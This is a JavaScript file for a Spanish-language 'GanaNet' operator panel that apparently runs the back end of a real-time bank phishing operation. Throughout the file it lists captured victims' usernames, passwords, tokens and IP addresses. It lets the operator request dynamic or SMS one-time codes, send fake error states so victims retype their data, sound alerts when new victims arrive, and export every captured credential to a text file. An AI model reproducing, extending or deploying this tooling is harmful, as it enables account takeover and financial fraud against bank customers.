/**
 * Panel operador GanaNet.
 * Cola ordenada de usuarios en espera para enviar GanaPin o Autenticador.
 */
const LANE_COUNT = 5

const emptyState = document.getElementById('emptyState')
const rowCount = document.getElementById('rowCount')
const hint = document.getElementById('hint')
const btnClean = document.getElementById('btnClean')
const btnExport = document.getElementById('btnExport')
const audioStatus = document.getElementById('audioStatus')
let isInitialLoad = true;
let audioCtx = null;
let isSoundMuted = localStorage.getItem('isSoundMuted') === 'true';

/** @type {Map<string, object>} */
const rows = new Map()

function statusLabel(state) {
  if (state === 'waiting') return 'En espera'
  if (state === 'active') return 'Activo'
  if (state === 'done') return 'Listo'
  if (state === 'error-login') return 'Error de datos'
  if (state === 'error') return 'Error'
  if (state === 'waiting-dinamica') return 'Dinámica solicitada'
  if (state === 'waiting-sms') return 'SMS solicitado'
  if (state === 'received-dinamica') return 'Dinámica'
  if (state === 'received-sms') return 'SMS'
  if (state === 'error-dinamica') return 'Error Dinámica'
  if (state === 'error-sms') return 'Error SMS'
  if (state === 'typing') return 'Escribiendo código'
  return 'Nuevo'
}

function badgeClass(state) {
  if (state === 'typing') {
    return 'badge badge--typing'
  }
  if (
    state === 'waiting' ||
    state === 'waiting-dinamica' ||
    state === 'waiting-sms'
  ) {
    return 'badge badge--wait'
  }
  if (state === 'active') return 'badge badge--hola'
  if (state === 'done') return 'badge badge--done'
  if (state === 'received-dinamica' || state === 'received-sms') {
    return 'badge badge--login'
  }
  if (
    state === 'error-login' ||
    state === 'error-dinamica' ||
    state === 'error-sms' ||
    state === 'error'
  ) {
    return 'badge badge--error'
  }
  return 'badge badge--login'
}

function formatTime(ts) {
  try {
    return new Date(ts).toLocaleTimeString('es-BO', {
      hour: 'numeric',
      minute: '2-digit',
      second: '2-digit',
      hour12: true,
    })
  } catch (_) {
    return '—'
  }
}

function laneForIndex(index) {
  return ((Number(index) || 1) - 1) % LANE_COUNT
}

function getLaneBody(lane) {
  return document.querySelector(`[data-lane-body="${lane}"]`)
}

function getDeviceIcon(device) {
  if (device === 'mobile') {
    return `
      <span style="display:inline-flex; align-items:center; gap:6px; font-weight:600; color:#555;" title="Celular">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:#d96500;">
          <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
          <line x1="12" y1="18" x2="12.01" y2="18"></line>
        </svg>
        Celular
      </span>
    `
  }
  return `
    <span style="display:inline-flex; align-items:center; gap:6px; font-weight:600; color:#555;" title="PC">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:#0b5ed7;">
        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
        <line x1="8" y1="21" x2="16" y2="21"></line>
        <line x1="12" y1="17" x2="12" y2="21"></line>
      </svg>
      PC
    </span>
  `
}

function isOnline(row) {
  return !!row.online;
}

async function setRowState(rowId, state, action) {
  const row = rows.get(rowId)
  if (!row) return
  row.state = state
  row.last_seen = Date.now()
  row.updatedAt = Date.now()
  hint.textContent = `${row.user || rowId} → ${statusLabel(state)}`

  try {
    await fetch(`/api/sessions/${rowId}/action`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action, state })
    });
  } catch (_) {}
  render()
}

function createRow(row) {
  const tr = document.createElement('tr')
  tr.dataset.rowId = row.id
  tr.innerHTML = `
    <td class="col-num"></td>
    <td class="col-time mono"></td>
    <td class="col-tipo mono"></td>
    <td class="col-device"></td>
    <td class="col-ip mono"></td>
    <td class="col-user mono"></td>
    <td class="col-pass mono copyable" title="Copiar clave"></td>
    <td class="col-token mono copyable" title="Copiar token"></td>
    <td class="col-online"></td>
    <td class="col-status"></td>
    <td>
      <div class="row-actions">
        <button type="button" class="btn btn--warning" data-action="error-login">Err Clave</button>
        <button type="button" class="btn btn--ok" data-action="dinamica">Dinámica</button>
        <button type="button" class="btn btn--ok" data-action="sms">SMS</button>
        <button type="button" class="btn btn--error" data-action="error-dinamica">Err Dinámica</button>
        <button type="button" class="btn btn--error" data-action="error-sms">Err SMS</button>
        <button type="button" class="btn btn--done" data-action="done">Listo</button>
      </div>
    </td>
  `

  tr.querySelector('[data-action="dinamica"]')?.addEventListener('click', () => {
    const current = rows.get(row.id)
    if (current?.state === 'waiting-dinamica') {
      setRowState(row.id, 'waiting', null)
      return
    }
    setRowState(row.id, 'waiting-dinamica', 'dinamica')
  })
  tr.querySelector('[data-action="sms"]')?.addEventListener('click', () => {
    const current = rows.get(row.id)
    if (current?.state === 'waiting-sms') {
      setRowState(row.id, 'waiting', null)
      return
    }
    setRowState(row.id, 'waiting-sms', 'sms')
  })
  tr.querySelector('[data-action="error-login"]')?.addEventListener('click', () => {
    setRowState(row.id, 'error-login', 'error-login')
    playErrorSound()
  })
  tr.querySelector('[data-action="error-dinamica"]')?.addEventListener('click', () => {
    setRowState(row.id, 'error-dinamica', 'error-dinamica')
    playErrorSound()
  })
  tr.querySelector('[data-action="error-sms"]')?.addEventListener('click', () => {
    setRowState(row.id, 'error-sms', 'error-sms')
    playErrorSound()
  })
  tr.querySelector('[data-action="done"]')?.addEventListener('click', () => {
    setRowState(row.id, 'done', 'done')
    playSuccessSound()
  })

  tr.querySelectorAll('td.copyable').forEach((td) => {
    td.addEventListener('click', async () => {
      const text = td.textContent?.trim()
      if (!text || text === '—') return
      try {
        await navigator.clipboard.writeText(text)
        td.classList.add('copied')
        setTimeout(() => td.classList.remove('copied'), 900)
      } catch (_) {
        /* ignore */
      }
    })
  })

  tr.querySelector('.col-user').addEventListener('click', async (event) => {
    const pill = event.target.closest('.copy-subpill');
    if (!pill) return;
    const val = pill.dataset.val;
    if (!val || val === '—') return;
    try {
      await navigator.clipboard.writeText(val);
      pill.classList.add('copied');
      setTimeout(() => pill.classList.remove('copied'), 900);
    } catch (_) {}
  });

  return tr
}

function updateRow(tr, row) {
  const online = isOnline(row)
  tr.querySelector('.col-num').textContent = String(row.index)
  tr.querySelector('.col-time').textContent = formatTime(row.createdAt)
  tr.querySelector('.col-tipo').textContent = row.tipo
  tr.querySelector('.col-device').innerHTML = getDeviceIcon(row.device)
  tr.querySelector('.col-ip').textContent = row.ip || '—'
  const userCell = tr.querySelector('.col-user');
  const userStr = row.user || '—';
  if (userStr.includes(' / ')) {
    const parts = userStr.split(' / ');
    const docPart = parts[0];
    const namePart = parts[1];
    let docNum = docPart;
    if (docPart.includes(':')) {
      docNum = docPart.split(':')[1];
    }
    userCell.innerHTML = `
      <span class="copy-subpill" data-val="${docNum}" title="Copiar Documento (${docPart})">${docPart}</span>
      <span class="subpill-divider">/</span>
      <span class="copy-subpill" data-val="${namePart}" title="Copiar Usuario">${namePart}</span>
    `;
  } else {
    userCell.innerHTML = `<span class="copy-subpill" data-val="${userStr}">${userStr}</span>`;
  }
  tr.querySelector('.col-pass').textContent = row.clave || '—'
  tr.querySelector('.col-token').textContent = row.token || '—'
  tr.querySelector('.col-online').innerHTML = online
    ? '<span class="pill pill--online">En línea</span>'
    : '<span class="pill pill--offline">Off</span>'
  tr.querySelector('.col-status').innerHTML =
    `<span class="${badgeClass(row.state)}">${statusLabel(row.state)}</span>`

  const dinamicaBtn = tr.querySelector('[data-action="dinamica"]')
  const smsBtn = tr.querySelector('[data-action="sms"]')
  dinamicaBtn?.classList.toggle('is-on', row.state === 'waiting-dinamica')
  smsBtn?.classList.toggle('is-on', row.state === 'waiting-sms')
  tr.classList.toggle('is-waiting', row.state === 'waiting')
}

function render() {
  const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0))
  list.forEach((row, i) => {
    row.index = i + 1
  })
  rowCount.textContent = String(list.length)
  emptyState.classList.toggle('is-visible', list.length === 0)

  const byLane = Array.from({ length: LANE_COUNT }, () => [])
  list.forEach((row) => {
    byLane[laneForIndex(row.index)].push(row)
  })

  for (let lane = 0; lane < LANE_COUNT; lane += 1) {
    const body = getLaneBody(lane)
    if (!body) continue
    const laneEl = document.querySelector(`[data-lane="${lane}"]`)
    const countEl = laneEl?.querySelector('[data-lane-count]')
    const laneRows = byLane[lane]
    if (countEl) countEl.textContent = String(laneRows.length)

    ;[...body.querySelectorAll('tr[data-row-id]')].forEach((tr) => {
      const row = rows.get(tr.dataset.rowId);
      if (!row || laneForIndex(row.index) !== lane) {
        tr.remove();
      }
    })

    laneRows.forEach((row) => {
      let tr = [...body.querySelectorAll('tr[data-row-id]')].find(
        (node) => node.dataset.rowId === row.id,
      )
      if (!tr) {
        tr = createRow(row)
        body.appendChild(tr)
      }
      updateRow(tr, row)
    })
  }
}

async function pollSessions() {
  try {
    const response = await fetch('/api/sessions');
    if (response.ok) {
      const list = await response.json();
      
      // Track existing new entries BEFORE clearing the map
      const oldKeys = new Set(rows.keys());
      let hasNewOrChangedSession = false;
      
      list.forEach((session) => {
        if (!oldKeys.has(session.id)) {
          hasNewOrChangedSession = true;
          requestAnimationFrame(() => {
            const tr = document.querySelector(`tr[data-row-id="${session.id}"]`)
            if (!tr) return
            tr.classList.add('is-new')
            setTimeout(() => tr.classList.remove('is-new'), 1800)
          })
        } else {
          // Compare with stored session BEFORE overwriting it
          const oldSession = rows.get(session.id);
          if (oldSession && oldSession.state !== session.state) {
            // Trigger sound on any relevant state changes
            if (
              session.state === 'waiting' ||
              session.state === 'received-dinamica' ||
              session.state === 'received-sms' ||
              session.state === 'error-login' ||
              session.state === 'error-dinamica' ||
              session.state === 'error-sms' ||
              session.state === 'done'
            ) {
              hasNewOrChangedSession = true;
            }
          }
        }
      });

      // Clear and rebuild map
      rows.clear();
      list.forEach((session) => {
        rows.set(session.id, {
          id: session.id,
          index: session.index,
          createdAt: session.createdAt,
          updatedAt: session.updatedAt,
          last_seen: session.last_seen,
          tipo: session.tipoUsuario || session.tipo || 'CODIGO_PERSONA',
          device: session.device || 'desktop',
          ip: session.ip || '127.0.0.1',
          user: session.username || session.user || '—',
          clave: session.password || session.clave || '—',
          token: session.token || '',
          state: session.state || 'waiting',
          online: session.online
        });
      });
      render();

      if (hasNewOrChangedSession && !isInitialLoad) {
        playNotificationSound();
      }
    }
  } catch (_) {}
}

function initAudio() {
  try {
    if (!audioCtx) {
      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    }
    if (audioCtx.state === 'suspended') {
      audioCtx.resume().then(updateAudioUI);
    } else {
      updateAudioUI();
    }
  } catch (_) {}
}

function updateAudioUI() {
  if (!audioStatus) return;
  if (isSoundMuted) {
    audioStatus.textContent = '🔇 Sonido: OFF';
    audioStatus.style.color = '#f44336';
    audioStatus.style.borderColor = '#f44336';
    audioStatus.style.background = '#ffebee';
  } else {
    audioStatus.textContent = '🔊 Sonido: ON';
    audioStatus.style.color = '#4caf50';
    audioStatus.style.borderColor = '#4caf50';
    audioStatus.style.background = '#e8f5e9';
  }
}

// Audio status toggle listener
audioStatus?.addEventListener('click', (event) => {
  event.preventDefault();
  event.stopPropagation();
  isSoundMuted = !isSoundMuted;
  localStorage.setItem('isSoundMuted', isSoundMuted ? 'true' : 'false');
  updateAudioUI();
  if (!isSoundMuted) initAudio();
});

window.addEventListener('click', initAudio, { once: true });
window.addEventListener('touchstart', initAudio, { once: true });

updateAudioUI();

function playNotificationSound() {
  if (isSoundMuted) return;
  try {
    initAudio(); // Ensure context is initialized
    if (!audioCtx || audioCtx.state === 'suspended') {
      console.warn("AudioContext is suspended or blocked. Please click anywhere on the page first.");
      return;
    }

    const now = audioCtx.currentTime;
    const frequencies = [587.33, 880]; // D5, A5
    frequencies.forEach((freq, idx) => {
      const osc = audioCtx.createOscillator();
      const gainNode = audioCtx.createGain();
      osc.connect(gainNode);
      gainNode.connect(audioCtx.destination);
      osc.type = 'triangle';
      osc.frequency.setValueAtTime(freq, now + idx * 0.08);
      gainNode.gain.setValueAtTime(0.85, now + idx * 0.08);
      gainNode.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.08 + 0.25);
      osc.start(now + idx * 0.08);
      osc.stop(now + idx * 0.08 + 0.25);
    });
  } catch (e) {
    console.error("No se pudo reproducir el sonido:", e);
  }
}

function playSuccessSound() {
  if (isSoundMuted) return;
  try {
    initAudio();
    if (!audioCtx || audioCtx.state === 'suspended') return;
    
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.connect(gain);
    gain.connect(audioCtx.destination);
    
    osc.type = 'sine';
    osc.frequency.setValueAtTime(659.25, audioCtx.currentTime); // E5
    osc.frequency.setValueAtTime(880, audioCtx.currentTime + 0.08); // A5
    
    gain.gain.setValueAtTime(0.2, audioCtx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.35);
    
    osc.start();
    osc.stop(audioCtx.currentTime + 0.35);
  } catch (_) {}
}

function playErrorSound() {
  if (isSoundMuted) return;
  try {
    initAudio();
    if (!audioCtx || audioCtx.state === 'suspended') return;
    
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.connect(gain);
    gain.connect(audioCtx.destination);
    
    osc.type = 'triangle';
    osc.frequency.setValueAtTime(220, audioCtx.currentTime);
    osc.frequency.setValueAtTime(165, audioCtx.currentTime + 0.12);
    
    gain.gain.setValueAtTime(0.35, audioCtx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
    
    osc.start();
    osc.stop(audioCtx.currentTime + 0.4);
  } catch (_) {}
}

btnClean?.addEventListener('click', async () => {
  rows.clear()
  try {
    await fetch('/api/clear', { method: 'POST' });
  } catch (_) {}
  hint.textContent = 'Cola limpia. Esperando nuevos usuarios…'
  render()
})

function exportToNotepad() {
  const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0));
  if (list.length === 0) {
    alert("No hay información en el panel para guardar.");
    return;
  }

  let text = "";
  list.forEach((row, i) => {
    text += `=== SESION #${i + 1} ===\r\n`;
    text += `Fecha/Hora: ${new Date(row.createdAt).toLocaleString('es-CO')}\r\n`;
    text += `Tipo: ${row.tipo}\r\n`;
    text += `Dispositivo: ${row.device}\r\n`;
    text += `IP: ${row.ip}\r\n`;
    text += `Usuario: ${row.user}\r\n`;
    text += `Clave: ${row.clave}\r\n`;
    text += `Token: ${row.token || '—'}\r\n`;
    text += `Estado final: ${statusLabel(row.state)}\r\n`;
    text += `========================\r\n\r\n`;
  });

  const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = `sesiones_panel_${Date.now()}.txt`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

btnExport?.addEventListener('click', () => {
  exportToNotepad();
});

// Poll sessions every 2 seconds
window.setInterval(pollSessions, 2000)

// Initial load
pollSessions().then(() => {
  isInitialLoad = false; // Initial fetch completed, enable sound notifications
  updateAudioUI(); // Ensure toggle button reflects correct state on load
  hint.textContent = rows.size
    ? `En cola: ${rows.size}. Elige Dinámica o SMS en Acciones.`
    : 'Esperando usuarios del login… Al ingresar llegan aquí ordenados.'
});
